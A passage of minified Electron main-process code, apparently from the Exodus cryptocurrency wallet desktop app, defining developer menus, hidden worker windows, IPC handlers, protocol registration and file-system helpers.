    const { toISOString: o } = Date.prototype,
      r = (e) => {
        if ([1 / 0, -1 / 0, NaN, void 0, null].includes(e)) return `${e}`;
        if (!["string", "boolean", "number"].includes(typeof e)) {
          if ("object" != typeof e) throw new Error("Unexpected value type");
          const t = Object.getPrototypeOf(e);
          if (t === Date.prototype && e.toISOString === o) return `new Date(${r(o.call(e))})`;
          if (!((t === Array.prototype && Array.isArray(e)) || t === Object.prototype)) throw new Error("Unexpected object given as value");
        }
        return JSON.stringify(e)
          .replace(/([{,])"__proto__":/g, '$1["__proto__"]:')
          .replace(/[^\\]"__proto__":/g, () => {
            throw new Error("Unreachable");
          })
          .replace(/[\u2028\u2029]/g, (e) => ((e) => `\\u${e.toString(16).padStart(4, "0")}`)(e.charCodeAt(0)));
      };
    e.exports = r;
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "setDefaultProtocols", function () {
      return a;
    }),
      n.d(t, "removeDefaultProtocols", function () {
        return u;
      });
    var o = n(0),
      r = n(1),
      i = n(20),
      s = n.n(i);
    const c = [r.PROTOCOL];
    function a() {
      s.a.beginEvent("setDefaultProtocols"), c.forEach((e) => o.app.setAsDefaultProtocolClient(e, process.execPath, ["--"])), s.a.endEvent("setDefaultProtocols");
    }
    function u() {
      c.forEach((e) => o.app.removeAsDefaultProtocolClient(e, process.execPath, ["--"]));
    }
  },
  function (e, t, n) {
    "use strict";
    const o = n(12),
      r = n(16).fromCallback,
      i = n(116);
    e.exports = {
      remove: r(function (e, t) {
        if (o.rm) return o.rm(e, { recursive: !0, force: !0 }, t);
        i(e, t);
      }),
      removeSync: function (e) {
        if (o.rmSync) return o.rmSync(e, { recursive: !0, force: !0 });
        i.sync(e);
      },
    };
  },
  function (e, t, n) {
    "use strict";
    var o = n(45),
      r = n.n(o),
      i = n(0),
      s = n(11),
      c = n.n(s),
      a = n(1),
      u = n(20),
      l = n(25),
      d = n(10),
      f = n(51),
      p = n(50),
      h = n(49),
      w = n(73),
      m = n(19),
      b = n(33),
      y = n(35);
    function g(e, ...t) {
      if ("function" != typeof e) throw new Error("Fist argument should be a function");
      const n = `(${e.toString()})(${t.map((e) => r()(e)).join(", ")})`;
      return () => Object(m.getWindow)().webContents.executeJavaScript(n);
    }
    const E = [["Nuke Wallet...", g(() => globalThis.Exodus.restore.deleteWallet())]],
      v = c()([
        "Restore",
        [
          ["Restore from 12-word phrase...", g(() => globalThis.Exodus.restore.fromRecoveryPhrase())],
          ["Restore from recovery link...", g(() => globalThis.Exodus.restore.fromRecoveryLink())],
          ["Restore from Safe Report...", g(() => globalThis.Exodus.import.safeReport.importFile())],
          ...(a.ENV_DEV ? E : []),
        ],
      ]),
      O = c()([
        "Data Folder",
        [
          ["Open Data Folder", () => i.shell.showItemInFolder(i.app.getPath("userData"))],
          ["Export Zipped Data Folder", g(() => globalThis.Exodus.export.dir.data())],
          ["Export Zipped Wallet Folder", g(() => globalThis.Exodus.export.dir.wallet())],
        ],
      ]),
      S = c()(["Manage Portfolios", [["Enable All", g(() => globalThis.Exodus.portfolios.enableAll())]]]),
      D = c()([
        "Notifications",
        [
          ["On", { type: "radio", checked: !0 }, g(() => globalThis.flux.actions.config.notifications.tx.receive.enable())],
          ["Off", { type: "radio", checked: !1 }, g(() => globalThis.flux.actions.config.notifications.tx.receive.disable())],
        ],
      ]),
      k = c()([
        "Sound",
        [
          [
            "Volume",
            [...Array(10).keys()].map((e) => 10 * (e + 1)).map((e) => [`${e}%`, { type: "radio", checked: 100 === e }, g((e) => globalThis.flux.actions.config.sounds.all.setVolume(e), e / 100)]),
          ],
          ["Test Volume Level", g(() => globalThis.flux.store.dispatch({ type: "TEST_VOLUME" }))],
        ],
      ]),
      _ = (e) => {
        const t = `(${((e) => globalThis.flux.actions.config.updateZoomFactor(e)).toString()})(${r()(e)})`;
        Object(m.getWindow)().webContents.executeJavaScript(t);
      },
      N = c()([
        "Zoom",
        [
          ["50%", { type: "radio", checked: !1 }, () => _(0.5)],
          ["75%", { type: "radio", checked: !1 }, () => _(0.75)],
          ["100%", { type: "radio", checked: !0 }, () => _(1)],
          ["150%", { type: "radio", checked: !1 }, () => _(1.5)],
          ["200%", { type: "radio", checked: !1 }, () => _(2)],
          ["300%", { type: "radio", checked: !1 }, () => _(3)],
        ],
      ]),
      x = c()([
        "Windows",
        [
          [
            "Network",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(h.getWindow)();
                  t.isVisible() ? t.hide() : t.show(), (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Wallet",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(y.getWindow)();
                  t.isVisible() ? t.hide() : t.show(), (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Monero",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(p.getWindow)();
                  t.isVisible() ? t.hide() : t.show(), (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Core",
            [
              [
                "Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(f.getWindow)();
                  t.isVisible() ? t.hide() : t.show(), (e.checked = t.isVisible());
                },
              ],
            ],
          ],
          [
            "Unlock",
            [
              [
                "Dev Tools Visible",
                { type: "checkbox", checked: !1 },
                (e) => {
                  const t = Object(b.getWindow)();
                  (e.checked = !t.webContents.isDevToolsOpened()), t.webContents.isDevToolsOpened() ? t.webContents.closeDevTools() : t.webContents.openDevTools();
                },
              ],
            ],
          ],
        ],
      ]),
      C = c()([
        "Debug Mode",
        [
          [
            "On",
            { type: "radio", checked: l.isExistsSync() },
            function () {
              l.isExistsSync() || W();
            },
          ],
          [
            "Off",
            { type: "radio", checked: !l.isExistsSync() },
            function () {
              l.isExistsSync() && W();
            },
          ],
        ],
      ]);
    function W() {
      l[l.isExistsSync() ? "remove" : "create"](async (e) => {
        e
          ? await i.dialog.showMessageBox({ title: "Restart", message: `Debug mode is now ${l.isExistsSync() ? "on" : "off"}. Please restart Exodus to activate the changes.`, buttons: ["OK"] })
          : await i.dialog.showMessageBox({ title: "Error", message: "There was a problem! Debug mode could not be changed!", buttons: ["OK"] });
      });
    }
    t.default = c()([
      "Developer",
      [
        v,
        O,
        D,
        k,
        x,
        N,
        "-",
        ["Open Developer Tools", () => Object(d.default)()],
        ["Open Current App Developer Tools", g(() => globalThis.Exodus.dapps.showDevTools())],
        C,
        "-",
        ["Export Safe Report Data", g(() => globalThis.Exodus.export.safeReport.dumpDiagnostics())],
        ...(u.PERF_METRICS_FEATURES ? [["Export Performance Metrics", g(() => globalThis.Exodus.export.performanceMetrics.exportToFile())]] : []),
        ["Export All Transactions", g(() => globalThis.Exodus.export.transactions.exportTransactionsAllWalletAccounts())],
        S,
        ["View Recovery Phrase", () => Object(w.init)()],
      ],
    ]);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return d;
    }),
      n.d(t, "init", function () {
        return f;
      });
    var o = n(0),
      r = n(8),
      i = n(10),
      s = n(13),
      c = n(5),
      a = n(7);
    const u = {
      ...a.default,
      backgroundColor: "#fff",
      x: 0,
      y: 0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !0,
      show: !1,
      skipTaskbar: !1,
      title: "Network Process (hidden window)",
      webPreferences: { ...a.isolation, partition: "persist:network", backgroundThrottling: !1 },
    };
    let l = null;
    const d = () => l;
    function f() {
      const e = o.screen.getPrimaryDisplay().size,
        t = { ...u, width: e.width / 3, height: e.height / 2 };
      (l = new o.BrowserWindow(t)),
        Object(r.registerWebContents)(l.webContents, "network"),
        Object(s.forwardErrors)(l.webContents, "network"),
        l.loadFile(c.WINDOW_NETWORK),
        Object(i.default)({ windowHandle: l.webContents, windowId: "network" }),
        l.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        });
      let n = !1;
      return (
        o.app.on("before-quit", () => {
          (n = !0), l.isDestroyed() || l.close();
        }),
        l.on("close", function (e) {
          n || (e.preventDefault(), l.hide());
        }),
        l
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return d;
    }),
      n.d(t, "init", function () {
        return f;
      });
    var o = n(0),
      r = n(8),
      i = n(10),
      s = n(13),
      c = n(5),
      a = n(7);
    const u = {
      ...a.default,
      x: 0,
      y: 0,
      backgroundColor: "#fff",
      width: 1120,
      height: 980,
      minWidth: 300,
      minHeight: 400,
      show: !1,
      title: "Monero Process (hidden window)",
      webPreferences: { ...a.isolation, partition: "persist:monero", backgroundThrottling: !1 },
    };
    let l = null;
    const d = () => l;
    function f(e) {
      const t = o.screen.getPrimaryDisplay().size,
        n = { ...u, width: t.width / 3, height: t.height / 2 };
      (l = new o.BrowserWindow(n)),
        Object(r.registerWebContents)(l.webContents, "monero"),
        Object(s.forwardErrors)(l.webContents, "monero"),
        l.loadFile(c.WINDOW_MONERO),
        Object(i.default)({ windowHandle: l.webContents, windowId: "monero" });
      let a = !1;
      return (
        o.app.on("before-quit", () => {
          (a = !0), l.isDestroyed() || l.close();
        }),
        l.on("close", function (e) {
          a || (e.preventDefault(), l.hide());
        }),
        l
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return m;
    }),
      n.d(t, "init", function () {
        return b;
      });
    var o = n(0),
      r = n(24),
      i = n.n(r),
      s = n(27),
      c = n(29),
      a = n(5),
      u = n(8),
      l = n(10),
      d = n(13),
      f = n(7);
    const p = (e) => i.a.existsSync(`${e}.lock`),
      h = {
        ...f.default,
        backgroundColor: "#fff",
        x: 0,
        y: 0,
        fullscreen: !1,
        fullscreenable: !1,
        maximizable: !1,
        minimizable: !1,
        resizable: !0,
        show: !1,
        skipTaskbar: !1,
        title: "Core process (hidden window)",
        webPreferences: { ...f.integration, partition: "core", backgroundThrottling: !1 },
      };
    let w = null;
    const m = () => w;
    function b() {
      const e = o.screen.getPrimaryDisplay().size,
        t = { ...h, width: e.width / 3, height: e.height / 2 };
      (w = new o.BrowserWindow(t)),
        Object(u.registerWebContents)(w.webContents, "core"),
        Object(d.forwardErrors)(w.webContents, "core"),
        w.loadFile(a.WINDOW_CORE),
        Object(l.default)({ windowHandle: w.webContents, windowId: "core" }),
        w.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        });
      let n = !1;
      return (
        o.app.on("before-quit", (e) => {
          const t = Object(s.default)(Object(c.walletDir)()),
            r = `${t.infoFile}.lock`,
            a = i.a.existsSync(r),
            u = p(t.storageFile) || p(t.unsafeStorageFile);
          a || u
            ? (a && console.log(`${r} exists.`), u && console.log("storage.seco is still writing"), e.preventDefault(), setTimeout(() => o.app.quit(), 2e3))
            : ((n = !0), w.isDestroyed() || w.close());
        }),
        w.on("close", function (e) {
          n || (e.preventDefault(), w.hide());
        }),
        w
      );
    }
  },
  function (e, t) {
    e.exports = require("child_process");
  },
  function (e, t) {
    var n = 1e3,
      o = 60 * n,
      r = 60 * o,
      i = 24 * r,
      s = 365.25 * i;
    function c(e, t, n) {
      if (!(e < t)) return e < 1.5 * t ? Math.floor(e / t) + " " + n : Math.ceil(e / t) + " " + n + "s";
    }
    e.exports = function (e, t) {
      t = t || {};
      var a,
        u = typeof e;
      if ("string" === u && e.length > 0)
        return (function (e) {
          if ((e = String(e)).length > 1e4) return;
          var t = /^((?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|years?|yrs?|y)?$/i.exec(e);
          if (!t) return;
          var c = parseFloat(t[1]);
          switch ((t[2] || "ms").toLowerCase()) {
            case "years":
            case "year":
            case "yrs":
            case "yr":
            case "y":
              return c * s;
            case "days":
            case "day":
            case "d":
              return c * i;
            case "hours":
            case "hour":
            case "hrs":
            case "hr":
            case "h":
              return c * r;
            case "minutes":
            case "minute":
            case "mins":
            case "min":
            case "m":
              return c * o;
            case "seconds":
            case "second":
            case "secs":
            case "sec":
            case "s":
              return c * n;
            case "milliseconds":
            case "millisecond":
            case "msecs":
            case "msec":
            case "ms":
              return c;
            default:
              return;
          }
        })(e);
      if ("number" === u && !1 === isNaN(e))
        return t.long
          ? c((a = e), i, "day") || c(a, r, "hour") || c(a, o, "minute") || c(a, n, "second") || a + " ms"
          : (function (e) {
              if (e >= i) return Math.round(e / i) + "d";
              if (e >= r) return Math.round(e / r) + "h";
              if (e >= o) return Math.round(e / o) + "m";
              if (e >= n) return Math.round(e / n) + "s";
              return e + "ms";
            })(e);
      throw new Error("val is not a non-empty string or a valid number. val=" + JSON.stringify(e));
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "isDeepLink", function () {
      return i;
    }),
      n.d(t, "maybeDeepLink", function () {
        return s;
      });
    var o = n(1),
      r = n(3);
    const i = (e) => {
        return new RegExp(`^${o.PROTOCOL}://fiat-(on|off)ramp`).test(e);
      },
      s = (e) => {
        if (!e || !i(e)) return;
        const {
          host: t,
          path: n,
          params: o,
        } = ((e) => {
          const { hostname: t, pathname: n, searchParams: o } = new URL(e);
          return { host: t, path: n.slice(1), params: Object.fromEntries(o.entries()) };
        })(e);
        r.appWindows.ui.webContents.send("fiat-onramp:data", { host: t, path: n, params: o }), r.appWindows.background.show();
      };
  },
  function (e, t, n) {
    "use strict";
    var o = n(0),
      r = n(4),
      i = n(75),
      s = n(62),
      c = n(48),
      a = n(72),
      u = n(71);
    const l = [s.default];
    l.push(a.default), "darwin" !== process.platform && l.push(c.default), l.push(u.default);
    const d = o.Menu.buildFromTemplate(l),
      f = (e, t) => e.items.find((e) => e.label === t);
    r.rpcMain.on("config:notifications", (e, { volumeLevel: t, notificationsTxReceivedEnabled: n, zoomFactor: o, onStartup: r }) => {
      const c = (() => ("darwin" === process.platform ? f(f(d, s.appName).submenu, "Developer").submenu : f(d, "Developer").submenu))();
      f(f(c, "Notifications").submenu, n ? "On" : "Off").checked = !0;
      const a = f(c, "Sound"),
        u = f(a.submenu, "Volume");
      f(u.submenu, `${parseInt(100 * t)}%`).checked = !0;
      const l = f(c, "Zoom");
      f(l.submenu, `${parseInt(100 * o)}%`).checked = !0;
      const p = !r;
      Object(i.default)(o, p);
    }),
      (t.default = d);
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromCallback,
      r = n(12),
      i = n(2),
      s = n(21),
      c = n(31).pathExists;
    e.exports = {
      outputFile: o(function (e, t, n, o) {
        "function" == typeof n && ((o = n), (n = "utf8"));
        const a = i.dirname(e);
        c(a, (i, c) =>
          i
            ? o(i)
            : c
            ? r.writeFile(e, t, n, o)
            : void s.mkdirs(a, (i) => {
                if (i) return o(i);
                r.writeFile(e, t, n, o);
              })
        );
      }),
      outputFileSync: function (e, ...t) {
        const n = i.dirname(e);
        if (r.existsSync(n)) return r.writeFileSync(e, ...t);
        s.mkdirsSync(n), r.writeFileSync(e, ...t);
      },
    };
  },
  function (e, t) {
    e.exports = {
      stringify: function (e, { EOL: t = "\n", finalEOL: n = !0, replacer: o = null, spaces: r } = {}) {
        const i = n ? t : "";
        return JSON.stringify(e, o, r).replace(/\n/g, t) + i;
      },
      stripBom: function (e) {
        return Buffer.isBuffer(e) && (e = e.toString("utf8")), e.replace(/^\uFEFF/, "");
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromCallback;
    e.exports = { copy: o(n(121)), copySync: n(118) };
  },
  function (e, t) {
    e.exports = require("module");
  },
  function (e, t) {
    e.exports = require("crypto");
  },
  function (e) {
    e.exports = { name: "exodus", productName: "Exodus", version: "25.9.2", releaseDate: "25.2.24", description: "Secure, manage, and trade blockchain assets." };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "appName", function () {
      return a;
    });
    var o = n(0),
      r = n(11),
      i = n.n(r),
      s = n(1),
      c = n(48);
    const a = (() => (s.ENV_BUILD_EXODUS ? "Exodus" : s.ENV_BUILD_EDEN ? "Eden" : s.ENV_BUILD_NAME))();
    let u;
    (u =
      "darwin" === process.platform
        ? i()([
            a,
            [
              ["About " + a, "about"],
              c.default,
              "-",
              { ...i()(["Services", "services"]), submenu: [] },
              "-",
              ["Hide " + a, "Command+H", "hide"],
              ["Hide Others", "Command+Shift+H", "hideothers"],
              ["Show All", "unhide"],
              "-",
              ["Quit", "Command+Q", o.app.quit.bind(o.app)],
            ].filter((e) => !!e),
          ])
        : i()(["File", [["Quit", "Command+Q", o.app.quit.bind(o.app)]].filter((e) => !!e)])),
      (t.default = u);
  },
  function (e, t, n) {
    const { app: o, BrowserWindow: r, screen: i, desktopCapturer: s } = n(0),
      c = n(32),
      { browserViewFromWebContents: a, browserWindowFromBrowserView: u } = n(23),
      l = { on: new Map(), handle: new Map() };
    l.on.set("app:exit", (e, t) => {
      o.exit(t);
    }),
      l.on.set("app:quit", () => {
        o.quit();
      }),
      l.on.set("app:relaunch", (e, { addArgs: t } = {}) => {
        t ? o.relaunch({ args: process.argv.slice(1).concat(t) }) : o.relaunch(), (e.returnValue = 0);
      }),
      l.on.set("app:meta", (e) => {
        e.returnValue = { DEBUG_MODE: globalThis.DEBUG_MODE };
      }),
      l.on.set("app:path", (e, t) => {
        if ("app" === t) e.returnValue = o.getAppPath();
        else {
          if (!["desktop", "userData"].includes(t)) throw ((e.returnValue = void 0), new Error(`Unsupported type: ${t}`));
          e.returnValue = o.getPath(t);
        }
      }),
      l.on.set("app:os:cpus", (e) => {
        e.returnValue = c.cpus().length;
      }),
      l.handle.set("app:os:info", () => ({ arch: c.arch(), platform: c.platform(), type: c.type(), release: c.release(), freemem: c.freemem(), totalmem: c.totalmem(), cpus: c.cpus().length }));
    const d = (e) => {
      const t = r.fromWebContents(e);
      if (t) return t;
      const n = a(e);
      return n ? u(n) : void 0;
    };
    l.on.set("sender:position:get", (e, t = {}) => {
      const n = d(e.sender);
      e.returnValue = n ? n.getPosition() : void 0;
    }),
      l.on.set("sender:size:get", (e, t = {}) => {
        const n = d(e.sender);
        e.returnValue = n ? n.getSize() : void 0;
      }),
      l.on.set("sender:sheetOffset:set", (e, ...t) => {
        const n = d(e.sender);
        n && n.setSheetOffset(...t), (e.returnValue = n ? 0 : 1);
      }),
      l.on.set("sender:close", (e, t = {}) => {
        d(e.sender).close(), (e.returnValue = void 0);
      }),
      l.handle.set("screen:display:all", () => i.getAllDisplays()),
      l.handle.set("screen:display:current", (e) => {
        const t = d(e.sender);
        if (!t) return;
        const [n, o] = t.getPosition();
        return i.getDisplayNearestPoint({ x: n, y: o });
      }),
      l.handle.set("screen:capturer:sources", async () => {
        const e = await s.getSources({ types: ["screen"] });
        return JSON.parse(JSON.stringify(e));
      }),
      (e.exports = l);
  },
  function (e, t, n) {
    "use strict";
    var o = n(0),
      r = n(24),
      i = n.n(r),
      s = n(2),
      c = n.n(s);
    const a = (e) => Number.isInteger(e);
    t.default = function (e) {
      let t, n;
      const r = { ...{ defaultWidth: 800, defaultHeight: 600, maximize: !0, fullScreen: !0 }, ...e },
        s = c.a.join(o.app.getPath("userData"), "window-state.json");
      try {
        if ((t = JSON.parse(i.a.readFileSync(s, "utf8").replace(/^\uFEFF/, ""))))
          if ((({ x: e, y: t, width: n, height: o }) => a(e) && a(t) && a(n) && a(o) && n > 0 && o > 0)(t)) {
            o.screen.getAllDisplays().some((e) => (({ x: e, y: t, width: n, height: o }, r) => e >= r.x && t >= r.y && e + n <= r.x + r.width && t + o <= r.y + r.height)(t, e.bounds)) ||
              (t = { x: 0, y: 0 });
          } else t.isMaximized || t.isFullScreen || (t = null);
        else t = null;
      } catch {}
      let u;
      t = { width: r.defaultWidth, height: r.defaultHeight, ...t };
      const l = {
        stateChange() {
          clearTimeout(u), (u = setTimeout(l.updateState, 100));
        },
        updateState() {
          if (n)
            try {
              if (!n.isMaximized() && !n.isMinimized() && !n.isFullScreen()) {
                const { x: e, y: o, width: r, height: i } = n.getBounds();
                Object.assign(t, { x: e, y: o, width: r, height: i });
              }
              (t.isMaximized = n.isMaximized()), (t.isFullScreen = n.isFullScreen());
            } catch (e) {}
        },
        closed() {
          n && (n.removeListener("resize", l.stateChange), n.removeListener("move", l.stateChange), n.removeListener("close", l.updateState), n.removeListener("closed", l.closed), (n = null)),
            clearTimeout(u);
          try {
            i.a.mkdirSync(c.a.dirname(s), { recursive: !0 }), i.a.writeFileSync(s, `${JSON.stringify(t)}\n`);
          } catch {}
        },
      };
      return {
        bounds: () => ({ x: t.x, y: t.y, width: t.width, height: t.height }),
        isMaximized: () => t.isMaximized,
        isFullScreen: () => t.isFullScreen,
        manage(e) {
          (n = e),
            r.maximize && t.isMaximized && n.maximize(),
            r.fullScreen && t.isFullScreen && n.setFullScreen(!0),
            n.on("resize", l.stateChange),
            n.on("move", l.stateChange),
            n.on("close", l.updateState),
            n.on("closed", l.closed);
        },
      };
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "CHANNEL_PREFIX", function () {
      return o;
    });
    const o = "electron-rpc-broadcast";
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "meta", function () {
      return l;
    });
    var o = n(0),
      r = n(2),
      i = n.n(r),
      s = n(14),
      c = n(5);
    const a = o.app.getAppPath();
    function u(e) {
      if (
        !(function (e) {
          const t = i.a.basename(e);
          return !!/^[a-z-]+(\.dev)?\.html$/.test(t) && e === i.a.join("src/static", t);
        })(e)
      )
        throw new Error("Unexpected html file path");
      const t = i.a.join(a, e);
      return Object(s.pathToFileURL)(t).toString();
    }
    const l = new Map(
      Object.entries({
        background: { url: u(c.WINDOW_BACKGROUND), protocols: ["file:"], offline: !0 },
        nfts: { url: u(c.WINDOW_NFTS), protocols: ["file:", "https:", "exodus-nfts-api:", ...[]], domains: ["nfts-proxy.exodus.io", ...[]], ipc: !1, permissions: ["clipboard-sanitized-write"] },
        ui: {
          persistName: "main",
          url: u(c.WINDOW_EXODUS),
          protocols: ["file:", "https:", "wss:", "localhost"],
          domains: "*",
          persistent: !0,
          ipc: !0,
          permissions: ["media", "openExternal", "clipboard-sanitized-write", "clipboard-read"],
          flags: ["trezor-origin"],
          downloads: [{ prefix: "blob:file://", mimetypes: ["application/pdf"], open: !0 }],
        },
        keyviewer: { url: u(c.WINDOW_KEYVIEWER), protocols: ["file:"], offline: !0, multiple: !0, ipc: !0 },
        monero: { url: u(c.WINDOW_MONERO), protocols: ["file:", "https:", "wss:", "localhost"], domains: "*", persistent: !0, ipc: !0 },
        network: { url: u(c.WINDOW_NETWORK), protocols: ["file:", "https:", "wss:", "localhost"], domains: "*", persistent: !0, ipc: !0 },
        core: { url: u(c.WINDOW_CORE), protocols: ["file:"], offline: !0, ipc: !0 },
        passphrase: { url: u(c.WINDOW_PASSPHRASE), protocols: ["file:"], offline: !0, ipc: !0 },
        "scan-qr": { url: u(c.WINDOW_SCAN_QR), protocols: ["file:"], offline: !0, ipc: !0, permissions: ["media"] },
        unlock: { url: u(c.WINDOW_UNLOCK), protocols: ["file:"], offline: !0, ipc: !0 },
        recovery: { url: u(c.WINDOW_RECOVERY), protocols: ["file:"], offline: !0, ipc: !0, multiple: !0, persistent: !0 },
        wallet: { url: u(c.WINDOW_WALLET), protocols: ["file:", "https:"], domains: ["server.exodus.io", "exodusapp.blob.core.windows.net"], multiple: !0, persistent: !0, ipc: !0 },
      })
    );
  },
  function (e, t, n) {
    "use strict";
    const o = n(12);
    e.exports = {
      utimesMillis: function (e, t, n, r) {
        o.open(e, "r+", (e, i) => {
          if (e) return r(e);
          o.futimes(i, t, n, (e) => {
            o.close(i, (t) => {
              r && r(e || t);
            });
          });
        });
      },
      utimesMillisSync: function (e, t, n) {
        const r = o.openSync(e, "r+");
        return o.futimesSync(r, t, n), o.closeSync(r);
      },
    };
  },
  function (e, t) {
    e.exports = require("assert");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "PACKAGE", function () {
      return c;
    }),
      n.d(t, "ENV_PROD", function () {
        return a;
      }),
      n.d(t, "ENV_TEST", function () {
        return u;
      }),
      n.d(t, "ENV_DEV", function () {
        return l;
      }),
      n.d(t, "ENV_BUILD_NAME", function () {
        return d;
      }),
      n.d(t, "ENV_BUILD_EXODUS", function () {
        return f;
      }),
      n.d(t, "ENV_BUILD_EDEN", function () {
        return p;
      }),
      n.d(t, "ENV_EXODUS_PROD", function () {
        return h;
      }),
      n.d(t, "NIGHTLY_BUILD", function () {
        return w;
      }),
      n.d(t, "FLAG_FILE_RESTORE_MNEMONIC", function () {
        return m;
      }),
      n.d(t, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE", function () {
        return b;
      }),
      n.d(t, "AUTO_UPDATE_BASE_URL", function () {
        return y;
      }),
      n.d(t, "PROTOCOL", function () {
        return g;
      }),
      n.d(t, "UNLOCK_WINDOW_HEIGHT", function () {
        return E;
      }),
      n.d(t, "MIN_WIDTH", function () {
        return v;
      }),
      n.d(t, "MIN_HEIGHT", function () {
        return O;
      });
    var o = n(15),
      r = n(53),
      i = n.n(r),
      s = n(61);
    const c = s,
      a = !0,
      u = !1,
      l = u || !1,
      d = "",
      f = "" === d,
      p = "eden" === d,
      h = a && f,
      w = !1,
      m = "restore-mnemonic",
      b = "restore-from-current-phrase",
      y = p ? "https://updates.exodus.io/releases/eden" : "https://updates.exodus.io/releases",
      g =
        (i()("3s"),
        o.fiatUnit,
        o.moneroInitialHeight,
        o.moneroInitialHeight,
        o.moneroSubaddressesEnabled,
        o.moneroSubaddressesEnabled,
        o.themeName,
        o.rbfEnabledBitcoin,
        o.rbfEnabledEthereum,
        o.adaLegacyAddressEnabled,
        o.bitcoinLegacyAddressEnabled,
        o.bitcoinTaprootAddressEnabled,
        o.wentThroughFiatOnboarding,
        p ? "exodus-eden" : "exodus"),
      E = 440,
      v = 1244,
      O = 700;
  },
  function (e, t, n) {
    "use strict";
    const o = (e) => ("string" != typeof e ? e.toLowerCase() : e);
    function r(e, t) {
      for (const n of ["alt", "control", "shift", "meta"]) if (Boolean(e[n]) !== Boolean(t[n])) return !1;
      return (e.code === t.code && void 0 !== e.code) || (o(e.key) === o(t.key) && void 0 !== e.key);
    }
    const i = new WeakMap();
    e.exports = {
      registerShortcut: function (e, t, n) {
        (function (e) {
          if (i.has(e)) return i.get(e);
          const t = [];
          i.set(e, t);
          const n = (e, n) => {
            if ("keyUp" !== n.type) for (const { inputStamp: e, callback: o } of t) if (r(e, n)) return o();
          };
          return e.on("before-input-event", n), e.once("closed", () => e.removeListener("before-input-event", n)), t;
        })(e.webContents).push({ inputStamp: t, callback: n });
      },
    };
  },
  function (e, t, n) {
    "use strict";
    var o = n(11),
      r = n.n(o);
    t.default = r()(["Window", [["Minimize", "CmdOrCtrl+M", "minimize"]]]);
  },
  function (e, t, n) {
    "use strict";
    var o = n(11),
      r = n.n(o);
    t.default = r()([
      "Edit",
      [
        ["Undo", "CmdOrCtrl+Z", "undo"],
        ["Redo", "Shift+CmdOrCtrl+Z", "redo"],
        "-",
        ["Cut", "CmdOrCtrl+X", "cut"],
        ["Copy", "CmdOrCtrl+C", "copy"],
        ["Paste", "CmdOrCtrl+V", "paste"],
        ["Select All", "CmdOrCtrl+A", "selectall"],
      ],
    ]);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "init", function () {
      return f;
    });
    var o = n(0),
      r = n(17),
      i = n(8),
      s = n(10),
      c = n(5),
      a = n(7),
      u = n(18);
    const l = {
      ...a.default,
      backgroundColor: "#fff",
      autoHideMenuBar: !0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      resizable: !1,
      show: !1,
      title: "View Recovery Phrase",
      webPreferences: { ...a.integration, partition: "persist:recovery" },
    };
    let d = null;
    function f() {
      return (
        (d = new o.BrowserWindow({ ...l })),
        Object(i.registerWebContents)(d.webContents, "recovery"),
        d.loadURL(Object(u.getHtmlUrl)({ app: o.app, filePath: c.WINDOW_RECOVERY })),
        Object(r.default)() && Object(s.default)({ windowHandle: d.webContents, windowId: "recovery" }),
        d.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        }),
        d.webContents.setWindowOpenHandler((e) => ({ action: "deny" })),
        o.app.on("before-quit", () => {
          d.isDestroyed() || d.close();
        }),
        d.webContents.once("dom-ready", () => d.show()),
        d
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "updateNftsViewBounds", function () {
      return g;
    });
    var o = n(45),
      r = n.n(o),
      i = n(0),
      s = n(14),
      c = n(1),
      a = n(23),
      u = n(4),
      l = n(8),
      d = n(3),
      f = n(5),
      p = n(30),
      h = n(28),
      w = n(19);
    let m = null;
    const b = () => {
      d.appWindows.background.removeBrowserView(m), d.appWindows.ui.webContents.focus();
    };
    let y = 0;
    const g = (e) => {
      (y = e || y), m && Object(h.updateViewBounds)(m, y);
    };
    p.maximizeWorkaroundHandlers.add(() => g()),
      w.navbarHeightChangeHandlers.add(g),
      i.protocol.registerSchemesAsPrivileged([{ scheme: "exodus-nfts-api", privileges: { bypassCSP: !0, secure: !0, supportFetchAPI: !0 } }]),
      u.rpcMain.handle("nfts:load", async () => {
        if (m) throw new Error("Already loaded!");
        (m = new i.BrowserView({
          webPreferences: {
            webSecurity: !0,
            enableRemoteModule: !1,
            contextIsolation: !0,
            nodeIntegration: !1,
            nodeIntegrationInWorker: !1,
            partition: "nfts",
            sandbox: !0,
            spellcheck: !1,
            webgl: !1,
            plugins: !1,
            safeDialogs: !0,
            disableDialogs: !0,
            backgroundColor: "#00000000",
            transparent: !0,
          },
          transparent: !0,
        })),
          Object(l.registerWebContents)(m.webContents, "nfts"),
          Object(a.registerBrowserView)(m),
          Object(h.updateViewBounds)(m, y),
          d.appWindows.background.contentView.on("bounds-changed", () => Object(h.updateViewBounds)(m, y)),
          d.appWindows.ui.webContents.on("devtools-reload-page", () => {
            b(), Object(a.destroyBrowserView)(m);
          });
